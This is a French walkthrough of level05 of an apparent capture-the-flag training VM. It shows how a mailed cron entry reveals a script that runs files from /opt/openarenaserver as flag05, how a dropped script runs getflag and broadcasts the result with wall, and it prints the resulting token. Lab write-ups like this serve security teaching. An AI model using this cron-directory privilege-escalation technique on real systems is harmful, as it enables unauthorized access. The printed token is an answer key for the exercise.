# level 05 

Pour avoir l'indice necessaire a la resolution de ce level, il faut se deconnecter de la VM et se reconnecter directement sur le level05. Un switch user du level04 vers le level05 ne suffit pas.   

Une fois qu'on se reconnecte, on voit apparaitre le message ```You have new mail.```   

On tente donc un find avec l execution de cat sur les resultats :

```bash
find / -name "mail" 2>/dev/null -exec cat {} \;
```

On voit alors apparaitre la ligne suivante :

```bash
MAILFILE="/var/spool/mail/$USER"
```

On ```cat``` ce file et on obtient : ```*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05``` ce qui semble etre une table cron.   

En l'etudiant, elle semble lancer toutes les deux minutes la commande ```su``` pour changer de user vers flag05, en utilisant l'option ```-c``` qui permet de lancer une commande, ici le script ```/usr/sbin/openarenaserver```.

On ```cat``` donc le contenu de ce script :   

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
Il s'agit donc d'une boucle qui va executer tous les executables dans le repertoire indique, puis les effacer. 

Pour eviter de devoir tout reecrire depuis le debut si l'exploit ne marche pas immediatement, on va le preparer dans ```/tmp```, puis le copier dans ```/opt/openarenaserver```.   
L'objectif est une nouvelle fois de faire executer la commande ```getflag```. Le souci, c'est que c'est sur une autre session que la commande sera executee. Pour en voir l'output, on va se servir de la commande ```wall``` pour que le message soit envoye a tous les utilisateurs logs, dont nous.
```bash
#!/bin/bash
echo $(getflag) | wall
```

On attend quelques instants, et on voit s'afficher sur l'ecran :
```bash
Broadcast Message from flag05@Snow                                             
        (somewhere) at 8:14 ...                                                
                                                                               
Check flag.Here is your token : viuaaale9huek52boumoomioc                      
```
Ce flag nous permet de nous log directement sur level06, une nouvelle fois sans passer par flag05. 
